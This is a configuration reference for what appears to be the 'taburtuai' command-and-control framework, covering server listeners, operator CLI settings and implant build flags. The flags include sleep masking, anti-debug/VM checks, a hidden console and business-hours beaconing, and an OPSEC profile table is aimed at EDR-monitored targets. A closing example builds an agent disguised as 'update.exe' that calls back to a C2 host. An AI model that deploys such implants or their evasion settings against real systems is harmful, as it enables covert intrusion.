# Configuration

Complete reference for server and agent configuration options.

---

## Server Configuration

Configuration is read from environment variables first, then overridden by CLI flags.

### Required

| Variable | Flag | Description |
|----------|------|-------------|
| `ENCRYPTION_KEY` | — | AES-256-GCM key for agent traffic. **Must match agent build.** No default — server refuses to start without it. |

### Network

| Variable | Flag | Default | Description |
|----------|------|---------|-------------|
| `PORT` | `--port` | `8080` | HTTP listener port |
| `HOST` | `--host` | `0.0.0.0` | Bind address |
| `TLS_ENABLED` | `--tls` | `false` | Enable HTTPS |
| `TLS_CERT` | `--tls-cert` | *(auto)* | Path to TLS certificate PEM |
| `TLS_KEY` | `--tls-key` | *(auto)* | Path to TLS key PEM |
| `TLS_PORT` | `--tls-port` | `8443` | HTTPS port |
| `WS_ENABLED` | `--ws` | `false` | Enable WebSocket listener |
| `WS_PORT` | `--ws-port` | `8081` | WebSocket port |
| `DNS_ENABLED` | `--dns` | `false` | Enable DNS authoritative listener |
| `DNS_PORT` | `--dns-port` | `5353` | DNS listener port (UDP) |
| `DNS_DOMAIN` | `--dns-domain` | *(none)* | Authoritative zone (e.g. `c2.example.com`) |

### Authentication

| Variable | Flag | Default | Description |
|----------|------|---------|-------------|
| `AUTH_ENABLED` | `--auth` | `false` | Require API key on all operator requests |
| `API_KEY` | `--api-key` | *(required if auth on)* | Bearer token for operators |
| `ADMIN_KEY` | `--admin-key` | *(optional)* | Secret for team server admin registration |
| `SECONDARY_KEY` | — | *(optional)* | Secondary AES-256 key (reserved) |

### Storage & Logging

| Variable | Flag | Default | Description |
|----------|------|---------|-------------|
| `DB_PATH` | `--db` | `./data/taburtuai.db` | SQLite database path |
| `LOG_DIR` | `--log-dir` | `./logs` | Log file directory |
| `LOG_LEVEL` | `--log-level` | `INFO` | `DEBUG` / `INFO` / `WARN` / `ERROR` |

### Agent Monitoring

| Variable | Default | Description |
|----------|---------|-------------|
| `AGENT_DORMANT_SEC` | `600` | Seconds without beacon before status → `dormant` |
| `AGENT_OFFLINE_SEC` | `1800` | Seconds without beacon before status → `offline` |

### Profile

| Variable | Flag | Default | Description |
|----------|------|---------|-------------|
| `PROFILE` | `--profile` | `default` | Malleable C2 profile name. Affects URI routing and beacon format. |

---

## Operator CLI Configuration

The operator CLI reads from environment variables or accepts per-command flags.

| Variable | Flag | Description |
|----------|------|-------------|
| `TABURTUAI_SERVER` | `--server` | Server URL. Example: `http://172.23.0.1:8080` |
| `TABURTUAI_API_KEY` | `--api-key` | API key (if server has auth enabled) |

**Recommended setup** — export once per shell session:
```bash
export TABURTUAI_SERVER=http://172.23.0.1:8080
export TABURTUAI_API_KEY=mysecrettoken
./bin/taburtuai console
```

---

## Agent Build-Time Configuration

These values are baked into the agent binary at compile time via `-ldflags`. Changing them requires a rebuild.

| Flag (generate CLI) | Description |
|---------------------|-------------|
| `--c2 <url>` | C2 server URL the agent connects to |
| `--key <string>` | AES-256 encryption key — must match server `ENCRYPTION_KEY` |
| `--interval <seconds>` | Beacon interval (default from profile) |
| `--jitter <percent>` | Jitter percentage applied to interval |
| `--kill-date <YYYY-MM-DD>` | Date after which agent self-terminates |
| `--working-hours <H-H>` | Restrict beacon to hours e.g. `8-18` |
| `--sleep-mask` | Enable VirtualProtect sleep masking |
| `--profile <name>` | OPSEC profile (default/stealth/aggressive/opsec/paranoid) |
| `--compress` | Compress output binary |
| `--no-gui` | Hide console window on Windows (`-H windowsgui`) |

---

## OPSEC Profile Comparison

Profiles are YAML files in `cmd/generate/profiles/` loaded at generate time.

| Profile | Interval | Jitter | Working Hours | Sleep Mask | Anti-Debug/VM | Best For |
|---------|----------|--------|---------------|-----------|---------------|----------|
| `default` | 30s | 30% | off | off | off | Lab testing, demos |
| `aggressive` | 5s | 10% | off | off | off | Speed-focused engagements |
| `opsec` | 60s | 30% | off | on | on | General production use |
| `stealth` | 300s | 50% | 08:00–18:00 | on | on | Monitored environments |
| `paranoid` | 600s | 50% | 09:00–17:00 | on | on | SOC-monitored, EDR-heavy targets |

**Important:** `stealth` and `paranoid` profiles use `working_hours_only: true`. The agent **will not beacon outside business hours** on the target system's local clock. Do not use these for testing unless you account for the timezone.

---

## Example: Production Deployment

```bash
# Server — with TLS, auth, and stealth profile
ENCRYPTION_KEY=$(openssl rand -hex 32) \
API_KEY=$(openssl rand -hex 16) \
TLS_ENABLED=true \
TLS_CERT=/etc/ssl/c2/cert.pem \
TLS_KEY=/etc/ssl/c2/key.pem \
PROFILE=stealth \
go run ./cmd/server --port 443 --tls-port 443

# Agent build for this server
go run ./cmd/generate stageless \
  --c2 https://c2.example.com \
  --key $ENCRYPTION_KEY \
  --profile stealth \
  --no-gui \
  --output ./payload/update.exe
```
